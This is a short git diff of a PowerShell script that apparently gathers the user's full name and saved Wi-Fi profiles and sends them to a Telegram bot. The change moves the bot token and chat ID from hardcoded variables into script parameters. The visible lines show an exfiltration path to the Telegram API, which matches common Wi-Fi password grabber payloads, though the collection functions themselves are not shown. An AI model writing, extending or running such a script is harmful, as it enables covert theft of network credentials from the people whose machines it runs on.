@@ -1,3 +1,8 @@
+param (
+    [string]$botToken,
+    [string]$chatId
+)
+
 # Define Functions
 
 function Get-fullName {
@@ -52,8 +57,7 @@ function Get-Networks {
     }
     return $WLANProfileObjects
 }
- 
-    
+
 # Call Functions
 
 $fullName = Get-fullName
@@ -72,8 +76,6 @@ foreach ($network in $networks) {
 
 # Telegram API Details
 
-$botToken = "" #input bottoken
-$chatId = "" #input chat id
 $apiUrl = "https://api.telegram.org/bot$botToken/sendMessage"
 
 # Send the Message via Telegram
